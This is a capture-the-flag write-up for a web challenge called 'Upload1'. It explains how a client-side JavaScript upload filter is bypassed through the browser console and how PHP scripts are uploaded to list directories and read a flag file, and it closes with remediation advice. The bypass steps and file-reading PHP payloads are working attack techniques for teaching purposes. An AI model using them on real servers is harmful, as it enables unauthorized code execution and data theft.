
# 🧩 CTF Writeup: Upload1

## 📝 Challenge Description

* **Category:** Web
* **Difficulty:** 2
* **Objective:** Exploit a file upload vulnerability to perform Remote Code Execution (RCE) and retrieve `flag.php` from the server.

The challenge provides a simple web interface with a file upload field. The primary obstacle is a client-side JavaScript filter that restricts uploads to specific image extensions (`.jpg`, `.png`).

---

## 🔍 Analysis

### 1. Client-Side Restriction

By inspecting the HTML source, we identify a JavaScript function `check()` tied to the `onchange` event of the file input.

```javascript
function check(){
    upfile = document.getElementById("upfile");
    submit = document.getElementById("submit");
    name = upfile.value;
    ext = name.replace(/^.+\./,''); // Extracts extension

    if(['jpg','png'].contains(ext)){
        submit.disabled = false;
    } else {
        submit.disabled = true;
        alert('请选择一张图片文件上传!');
    }
}

```

This logic is purely **client-side**. The browser prevents the "Submit" button from being clickable if the extension isn't in the whitelist. Since the server (presumably) doesn't perform secondary validation on the file extension, we can bypass this entirely.

### 2. Information Leakage

Upon a successful upload, the application returns the path of the uploaded file:
`upload success : upload/1771699520.shell.png`
This tells us:

1. The upload directory is `/upload/`.
2. The server preserves (or partially preserves) our filename, allowing us to guess the URL of our payload.

---

## 🛠️ Exploitation Path

### Step 1: Bypassing the Client-Side Lock

There are two main ways to bypass this check:

1. **DOM Manipulation:** Use the Browser Console to disable the `onchange` event.
2. **Interception Proxy:** Use a tool like **Burp Suite** to intercept the request and change the filename/content-type after the browser has already "cleared" it.

In this case, we used the Console method:

```javascript
// Remove the function trigger that disables the button
document.getElementById("upfile").onchange = null;
// Manually re-enable the button if it was already locked
document.getElementById("submit").disabled = false;

```

### Step 2: Directory Traversal Payload

Once the button was enabled, I uploaded a PHP script (`explore.php`) to map the server's filesystem and locate the flag.

**Payload:**

```php
<?php
echo "<pre>--- Current Directory ---\n";
print_r(scandir("."));
echo "\n--- Parent Directory ---\n";
print_r(scandir(".."));
echo "</pre>";
?>

```

Accessing `upload/explore.php` revealed a file named `flag.php` in the parent directory (`../`).

### Step 3: Final Flag Extraction

Since `flag.php` likely contains PHP code that won't render in the browser (it will execute and show nothing), I used `highlight_file()` or `file_get_contents()` to read the source code.

**Final Payload:**

```php
<?php
echo "<pre>";
highlight_file("../flag.php");
echo "</pre>";
?>

```

---

## 🚩 Conclusion

The server failed to implement **Server-Side Validation**. Relying on JavaScript for security is a common pitfall; an attacker can always manipulate the client environment to send unauthorized data.

### 🛡️ Remediation

* **Always validate on the server:** Check file extensions and MIME types on the backend.
* **Rename Uploads:** Store files with randomly generated names to prevent direct execution.
* **Disable Execution:** Configure the `/upload/` directory to treat all files as static content rather than executable scripts (e.g., using `.htaccess` or server config).

**Would you like me to help you draft a more technical "Mitigation" section including specific Apache or Nginx configurations?**